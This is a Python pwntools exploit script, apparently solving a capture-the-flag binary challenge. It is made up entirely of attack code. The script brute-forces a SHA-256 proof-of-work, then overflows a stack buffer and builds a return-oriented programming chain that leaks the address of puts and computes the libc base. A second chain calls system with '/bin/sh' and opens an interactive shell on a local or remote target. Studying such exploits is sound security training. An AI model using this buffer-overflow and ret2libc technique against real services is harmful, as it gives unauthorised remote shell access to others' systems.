#!/usr/bin/env python
# -*- coding: utf-8 -*-
# python solve.py ip port 0x17f0
from pwn import *
import hashlib

code = ELF('./bs')
context.arch = code.arch
context.log_level = 'debug'
libc = code.libc

if len(sys.argv) > 2:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    #r = remote('127.0.0.1', 4444)
    r = process('./bs')

g = lambda x: next(code.search(asm(x, os='linux', arch='amd64')))
pop_rdi = g('pop rdi; ret')
pop_rsi_pop = g('pop rsi; pop r15; ret')
leave = g('leave; ret')

chal = r.recvline().strip()
pad = chal[12:12+16]
dst = chal[33:33+64]
info(pad)
info(dst)
sol = iters.bruteforce(lambda x: hashlib.sha256(x+pad).hexdigest() == dst, string.ascii_letters+string.digits, 4, 'fixed')
r.send(sol)

size = int(sys.argv[-1], 16)
r.sendlineafter('send?\n', str(size))

buf = 0x602f00
payload = ''
payload += 'A'*0x1010
payload += flat(
    buf,
    pop_rdi, code.got['puts'],
    code.plt['puts'],
    pop_rdi, 0,
    pop_rsi_pop, buf, 0,
    code.plt['read'],
    #csu_rop([0x400B10, 0x400B2A], code.got['read'], [0, buf, 0x100], buf),
    leave,
    )

payload = payload.ljust(size, 'A')
raw_input('#')
r.send(payload)
r.recvuntil('goodbye.\n')
leak = r.recvline().strip()[-6:].ljust(8, '\0')
leak = u64(leak)
libc.address = leak - libc.sym['puts']
info("%#x", libc.address)
bin_sh = libc.search('/bin/sh').next()
system = libc.sym['system']
payload = ''
payload += flat(
    0,
    pop_rdi, bin_sh,
    system,
    0xdeadbeef
    )
r.send(payload)
r.interactive()
